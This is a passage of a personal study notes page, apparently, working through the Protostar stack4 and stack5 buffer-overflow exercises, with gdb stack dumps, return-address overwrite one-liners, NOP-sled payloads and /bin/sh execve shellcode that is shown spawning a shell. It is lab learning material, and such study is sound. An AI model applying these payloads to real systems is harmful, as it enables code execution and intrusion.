  ebp at 0xbffffd78, eip at 0xbffffd7c
(gdb) x/32x $esp
0xbffffd20:     0xbffffd30      0xb7ec6165      0xbffffd38      0xb7eada75
0xbffffd30:     0x41414141      0x42424242      0xbffffd00      0x080482e8
0xbffffd40:     0xb7ff1040      0x080495ec      0xbffffd78      0x08048449
0xbffffd50:     0xb7fd8304      0xb7fd7ff4      0x08048430      0xbffffd78
0xbffffd60:     0xb7ec6365      0xb7ff1040      0x0804843b      0xb7fd7ff4
0xbffffd70:     0x08048430      0x00000000      0xbffffdf8      0xb7eadc76
0xbffffd80:     0x00000001      0xbffffe24      0xbffffe2c      0xb7fe1848
0xbffffd90:     0xbffffde0      0xffffffff      0xb7ffeff4      0x0804824b

user@protostar:/opt/protostar/bin$ python -c &#39;print(&quot;A&quot;*19*4+&quot;\xf4\x83\x04\x08&quot;)&#39; | ./stack4
code flow successfully changed
Segmentation fault
</code></pre></div>
</td></tr></table>
<p>Notes:
* find out adress of function win
* find out adress of saved <strong>Stack Pointer</strong>
* Offset: 19 Blocks each 4 Bytes
* overwrite <strong>Return Pointer</strong></p>
<h2 id="stack5">stack5<a class="headerlink" href="#stack5" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
</td></tr></table>
<blockquote>
<p>Stack5 is a standard buffer overflow, this time introducing shellcode.
This level is at /opt/protostar/bin/stack5
Hints:
* At this point in time, it might be easier to use someone elses shellcode
* If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
* remove the int3s once your shellcode is done.</p>
</blockquote>
<p>Shellcode
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>    <span class="err">*****************************************************</span>
    <span class="err">*</span>    <span class="nf">Linux</span><span class="err">/</span><span class="no">x86</span> <span class="no">execve</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">sh</span> <span class="no">shellcode</span> <span class="mi">23</span> <span class="no">bytes</span>    <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>         <span class="nl">Author:</span> <span class="nf">Hamza</span> <span class="no">Megahed</span>             <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>             <span class="nl">Twitter:</span> <span class="err">@</span><span class="nf">Hamza_Mega</span>                  <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>     <span class="nl">blog:</span> <span class="nf">hamza-mega</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">blogspot</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">com</span>         <span class="p">*</span>
    <span class="err">*****************************************************</span>
    <span class="err">*</span>   <span class="nl">E-mail:</span> <span class="nf">hamza</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">megahed</span><span class="p">[</span><span class="no">at</span><span class="p">]</span><span class="no">gmail</span><span class="p">[</span><span class="no">dot</span><span class="p">]</span><span class="no">com</span>      <span class="p">*</span>
    <span class="err">*****************************************************</span>

<span class="nf">xor</span>    <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span>
<span class="nf">push</span>   <span class="nv">%eax</span>
<span class="nf">push</span>   <span class="no">$0x68732f2f</span>
<span class="nf">push</span>   <span class="no">$0x6e69622f</span>
<span class="nf">mov</span>    <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ebx</span>
<span class="nf">push</span>   <span class="nv">%eax</span>
<span class="nf">push</span>   <span class="nv">%ebx</span>
<span class="nf">mov</span>    <span class="nv">%esp</span><span class="p">,</span><span class="nv">%ecx</span>
<span class="nf">mov</span>    <span class="no">$0xb</span><span class="p">,</span><span class="nv">%al</span>
<span class="nf">int</span>    <span class="no">$0x80</span>

<span class="err">********************************</span>
<span class="c1">#include &lt;stdio.h&gt;</span>
<span class="c1">#include &lt;string.h&gt;</span>

<span class="nf">char</span> <span class="p">*</span><span class="no">shellcode</span> <span class="err">=</span> <span class="err">&quot;\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x62</span><span class="err">\</span><span class="no">x69</span><span class="err">&quot;</span>
          <span class="err">&quot;\</span><span class="nf">x6e</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe3</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x53</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe1</span><span class="err">\</span><span class="no">xb0</span><span class="err">\</span><span class="no">x0b</span><span class="err">\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span><span class="err">&quot;</span><span class="c1">;</span>

<span class="nf">int</span> <span class="no">main</span><span class="p">(</span><span class="no">void</span><span class="p">)</span>
<span class="err">{</span>
<span class="nf">fprintf</span><span class="p">(</span><span class="no">stdout</span><span class="p">,</span><span class="err">&quot;</span><span class="no">Length</span><span class="p">:</span> <span class="nv">%d</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span><span class="no">strlen</span><span class="p">(</span><span class="no">shellcode</span><span class="p">))</span><span class="c1">;</span>
<span class="err">(*(</span><span class="nf">void</span><span class="p">(*)())</span> <span class="no">shellcode</span><span class="p">)()</span><span class="c1">;</span>
<span class="nf">return</span> <span class="mi">0</span><span class="c1">;</span>
<span class="err">}</span>

<span class="nl">Payload:</span>
<span class="err">\</span><span class="nf">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x68</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x62</span><span class="err">\</span><span class="no">x69</span><span class="err">\</span><span class="no">x6e</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe3</span><span class="err">\</span><span class="no">x50</span><span class="err">\</span><span class="no">x53</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xe1</span><span class="err">\</span><span class="no">xb0</span><span class="err">\</span><span class="no">x0b</span><span class="err">\</span><span class="no">xcd</span><span class="err">\</span><span class="no">x80</span>
</code></pre></div>
</td></tr></table></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span>
<span class="normal">8</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>./vuln $(python -c &#39;print &quot;\x90&quot;*40 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*47 + &quot;\x20\xce\xff\xff&quot;&#39;)

./vuln $(python -c &#39;print &quot;\x90&quot;*40 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*47 + &quot;\x20\xce\xff\xff&quot;&#39;)

 (gdb) shell python -c &#39;print &quot;\x90&quot;*40 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*3 +&quot;B&quot;*4*2 + &quot;\x20\xce\xff\xff&quot;&#39; &gt; /home/user/input
(gdb) run

(gdb) shell python -c &#39;print &quot;\x90&quot;*32 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot; + &quot;A&quot;*3 +&quot;B&quot;*4*4 + &quot;\x90\xf7\xff\xbf&quot;&#39; &gt; /home/user/input
</code></pre></div>
</td></tr></table>
<p>Notes:
* <a href="https://dhavalkapil.com/blogs/Shellcode-Injection/">Shellcode Explanation</a>
* <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">Shellcode</a>
* \x90 stands for <code>nops</code> in hex</p>
<h2 id="scratch-notes">Scratch Notes<a class="headerlink" href="#scratch-notes" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code>user@protostar:~$ python -c &#39;import struct; p = struct.pack(&quot;&gt;I&quot;, 0x12345678); print(&quot;\x42&quot;*4 + p)&#39; | hexdump -C
00000000  42 42 42 42 12 34 56 78  0a                       |BBBB.4Vx.|
00000009
user@protostar:~$ python -c &#39;import struct; p = struct.pack(&quot;&gt;I&quot;, 0x12345678); print(&quot;\xCC&quot;*4 + p)&#39; | hexdump -C
00000000  cc cc cc cc 12 34 56 78  0a                       |.....4Vx.|
00000009
user@protostar:~$ python -c &#39;import struct; p = struct.pack(&quot;I&quot;, 0x12345678); print(&quot;\xCC&quot;*4 + p)&#39; | hexdump -C
00000000  cc cc cc cc 78 56 34 12  0a                       |....xV4..|
00000009
user@protostar:~$ python -c &#39;import struct; p = struct.pack(&quot;&lt;I&quot;, 0x12345678); print(&quot;\xCC&quot;*4 + p)&#39; | hexdump -C
00000000  cc cc cc cc 78 56 34 12  0a                       |....xV4..|
00000009
user@protostar:~$ python -c &#39;import struct; p = struct.pack(&quot;I&quot;, 0x12345678); print(&quot;\xCC&quot;*4 + p)&#39; | hexdump -C
00000000  cc cc cc cc 78 56 34 12  0a                       |....xV4..|
00000009
</code></pre></div>
</td></tr></table>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code># program gets argument on runtime in gdb
user@protostar:/opt/protostar/bin$ python -c &#39;print(&quot;A&quot;*64+&quot;BB&quot;)&#39; &gt; /home/user/input
(gdb) run $(cat /home/user/input)

# objdump basic usage
objdump -d -M intel &lt;binary&gt;
</code></pre></div>
</td></tr></table>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> shell python -c <span class="s2">&quot;import struct; print &#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&#39; + &#39;A&#39; + &#39;B&#39;*4*13  + struct.pack(&#39;I&#39;, 0xbffff770) &quot;</span> &gt; /home/user/input
<span class="o">(</span>gdb<span class="o">)</span> run
The program being debugged has been started already.
Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y
Starting program: /opt/protostar/bin/stack5 &lt; /home/user/input

Breakpoint <span class="m">1</span>, 0x080483d4 <span class="k">in</span> main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">1</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff864<span class="o">)</span> at stack5/stack5.c:10
<span class="m">10</span>      <span class="k">in</span> stack5/stack5.c
<span class="o">(</span>gdb<span class="o">)</span> x/32x <span class="nv">$esp</span>
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0xb7fd7ff4      0x0804958c      0xbffff788      0x080482c4
0xbffff780:     0xb7ff1040      0x0804958c      0xbffff7b8      0x08048409
0xbffff790:     0xb7fd8304      0xb7fd7ff4      0x080483f0      0xbffff7b8
0xbffff7a0:     0xb7ec6365      0xb7ff1040      0x080483fb      0xb7fd7ff4
0xbffff7b0:     0x080483f0      0x00000000      0xbffff838      0xb7eadc76
0xbffff7c0:     0x00000001      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.

Breakpoint <span class="m">2</span>, main <span class="o">(</span><span class="nv">argc</span><span class="o">=</span><span class="m">0</span>, <span class="nv">argv</span><span class="o">=</span>0xbffff864<span class="o">)</span> at stack5/stack5.c:11
<span class="m">11</span>      <span class="k">in</span> stack5/stack5.c
<span class="o">(</span>gdb<span class="o">)</span> x/32x <span class="nv">$esp</span>
0xbffff760:     0xbffff770      0xb7ec6165      0xbffff778      0xb7eada75
0xbffff770:     0x6850c031      0x68732f2f      0x69622f68      0x50e3896e
0xbffff780:     0xb0e18953      0x4180cd0b      0x42424242      0x42424242
0xbffff790:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff7a0:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffff7b0:     0x42424242      0x42424242      0x42424242      0xbffff770
0xbffff7c0:     0x00000000      0xbffff864      0xbffff86c      0xb7fe1848
0xbffff7d0:     0xbffff820      0xffffffff      0xb7ffeff4      0x08048232
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
Executing new program: /bin/dash
Error <span class="k">in</span> re-setting breakpoint <span class="m">1</span>: No symbol table is loaded.  Use the <span class="s2">&quot;file&quot;</span> command.
Error <span class="k">in</span> re-setting breakpoint <span class="m">2</span>: No symbol table is loaded.  Use the <span class="s2">&quot;file&quot;</span> command.
Error <span class="k">in</span> re-setting breakpoint <span class="m">1</span>: No symbol <span class="s2">&quot;main&quot;</span> <span class="k">in</span> current context.
Error <span class="k">in</span> re-setting breakpoint <span class="m">2</span>: No symbol <span class="s2">&quot;main&quot;</span> <span class="k">in</span> current context.
Error <span class="k">in</span> re-setting breakpoint <span class="m">1</span>: No symbol <span class="s2">&quot;main&quot;</span> <span class="k">in</span> current context.
Error <span class="k">in</span> re-setting breakpoint <span class="m">2</span>: No symbol <span class="s2">&quot;main&quot;</span> <span class="k">in</span> current context.

Program exited normally.
<span class="o">(</span>gdb<span class="o">)</span>
</code></pre></div>
</td></tr></table>
<h2 id="python-foo">Python Foo<a class="headerlink" href="#python-foo" title="Permanent link">&para;</a></h2>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="err">$</span> <span class="n">python</span>
<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">struct</span>
<span class="o">&gt;&gt;&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span> <span class="c1"># big endian Integer &gt;I</span>
<span class="n">ABCD</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="mh">0x41424344</span><span class="p">)</span> <span class="c1"># little endian Integer &lt;I</span>
<span class="n">DCBA</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&gt;I&quot;</span><span class="p">,</span> <span class="s2">&quot;ABCD&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># &quot;\x41\x42\x43\x44&quot; as big endian number</span>
<span class="mh">0x41424344</span>
<span class="o">&gt;&gt;&gt;</span> <span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;&lt;I&quot;</span><span class="p">,</span> <span class="s2">&quot;ABCD&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span> <span class="c1"># interpret as little endian number</span>
<span class="mh">0x44434241</span>
</code></pre></div>
</td></tr></table>
                
              
              
                


              
            </article>
          </div>
        </div>
        
      </main>
      
        
<footer class="md-footer">
  
    <nav class="md-footer__inner md-grid" aria-label="Footer">
      
        
        <a href="../hacking/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Hacking the art of exploitation" rel="prev">
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
          </div>
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Previous
              </span>
              Hacking the art of exploitation
            </div>
          </div>
        </a>
      
      
        
        <a href="../cyber_sec_tools/" class="md-footer__link md-footer__link--next" aria-label="Next: Tools" rel="next">
          <div class="md-footer__title">
            <div class="md-ellipsis">
              <span class="md-footer__direction">
                Next
              </span>
              Tools
            </div>
          </div>
          <div class="md-footer__button md-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
          </div>
        </a>
      
    </nav>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; Felix Körner under CC BY-SA 3.0 DE
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
        
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    <script id="__config" type="application/json">{"base": "..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../assets/javascripts/workers/search.709b4209.min.js", "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.2b46852b.min.js"></script>
      
    
  </body>
</html>